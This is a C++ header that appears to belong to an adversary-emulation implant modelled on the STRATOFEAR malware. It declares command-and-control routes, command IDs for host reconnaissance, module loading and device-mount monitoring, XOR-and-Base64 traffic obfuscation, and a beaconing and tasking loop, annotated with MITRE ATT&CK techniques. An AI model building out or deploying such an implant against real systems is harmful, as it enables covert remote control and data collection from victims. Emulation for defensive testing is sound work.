#pragma once
#ifndef __COMMS_H__
#define __COMMS_H__

#include <string>
#include <iostream>
#include <vector>
#include <unistd.h>
#include <chrono>
#include <thread>
#include <curl/curl.h>

#include "json.hpp"
#include "core.hpp"
#include "base64.hpp"

namespace Communication {
    static int MIN_SLEEP_MS = 5000;
    static int MAX_SLEEP_MS = 15000;
    // Routes for C2
    const std::string REGISTER_ROUTE = "/";
    const std::string TASK_ROUTE = "/directory/v1/";
    // Command IDs
    const std::string HEARTBEAT_ID = "0x60";
    const std::string RETRIEVE_HOST_INFO = "0x07";
    const std::string LOAD_MODULE_ID = "0x62";
    const std::string RETRIEVE_MODULE_RESULT = "0x64";
    const std::string MONITOR_DEVICE_MOUNT = "0x47";


    namespace HTTPS {
        class Response {
        public:
                std::string protocol;
                std::string body;
                std::string command;
                std::vector<unsigned char> moduleBytes;
        };
        /*
        * ParseHTTPSResponse():
        *      About:
        *           Parses the HTTPS response. Expects a Base64 encoded 
        *           XOR'd JSON string. Uses nlohmann JSON library.
        *      Result:
        *           Assuming the information is provided, adds to the 
        *           following to the response object:
        *           1. Command ID 
        *           2. Module file bytes
        *           3. Module file size
        *      Returns:
        *           Returns an HTTPS response from the C2 Server
        *      MITRE ATT&CK Techniques:
        *           T1140: Deobfuscate/Decode Files or Information 
        */
        Response ParseHTTPSResponse(Response serverResponse, bool is_file);
        /*
        * BuildBody():
        *      About:
        *           Based on the command ID, builds an encoded 
        *           XOR'd string for POST body. 
        *      Result:
        *           Creates a string containing the information the 
        *           C2 server is requesting using the command ID.
        *      Returns:
        *           command IDs using GET request: Returns an empty 
        *           string
        *           command IDs using POST request: Returns an 
        *           encoded XOR'd string
        * */
        std::string BuildBody(Configuration stratofearConfig, std::string command, std::string filename, std::string data);
        /*
        * BuildRoute():
        *      About:
        *           Builds the url route used by the implant to send 
        *           requests to the C2 Server. 
        *      Result:
        *           Provides the expected route based on the command ID
        *      Returns:
        *           Returns the url to use with a POST or GET request
        *      MITRE ATT&CK Techniques:
        *           T1071.001: Application Layer Protocol: Web Protocols 
        */
        std::string BuildRoute(Configuration stratofearConfig, std::string command);
        /*
        * SendHTTPSRequest():
        *      About:
        *           Builds and executes the HTTPS request for both GET & POST  
        *      Result:
        *           Sends an HTTPS packet across the wire
        *      Returns:
        *           Returns the HTTPS response from the server
        *      MITRE ATT&CK Techniques:
        *           T1071.001: Application Layer Protocol: Web Protocols
        *           T1573.002 Encrypted Channel: Asymmetric Cryptography
        */
        Response SendHTTPSRequest(std::string type, Configuration stratofearConfig, std::string command, std::string filename, std::string data);
        /*
        * convertString_XOR_Enc():
        *      About:
        *           Converts a plain text string into an encoded 
        *           XOR'd string
        *      Result:
        *           Encoded XOR string
        *      Returns:
        *           Base64 string containing the plaintext in a XOR cipher
        */        
       std::string convertString_XOR_Enc(std::string input);
    }
        /*
        * C2CommsLoop():
        *      About:
        *           Main loop performing registration with C2, 
        *           heartbeats, and tasking
        *      Result:
        *           Sends an HTTPS POST request to register with the C2 
        *           server. Sends an HTTPS GET request for heartbeats. 
        *           When C2 server provides a tasking, executes the task 
        *           and continues with GET requests for heartbeat. 
        *           Sleeps between each iteration 
        *      Returns:
        *           Void
        *      MITRE ATT&CK Techniques:
        *           T1071.001: Application Layer Protocol: Web Protocols 
        *      CTI:
        *           https://www.mandiant.com/resources/blog/north-korea-supply-chain
        *           https://www.jamf.com/blog/threat-hunting-unraveling-malware-tactics/ 
        */
    void C2CommsLoop(Configuration stratofearConfig);
        /*
        * XorCryptToString():
        *      About:
        *           Converts the provided string into an XOR'd 
        *           string using an unsigned char with "k" as the key
        *      Result:
        *           Each unsigned char within the vector is XOR'd 
        *           with "k" to avoid null bytes
        *      Returns:
        *           String containing the XOR encrypted string
        */
    std::string XorCryptToString(std::string input);
}
#endif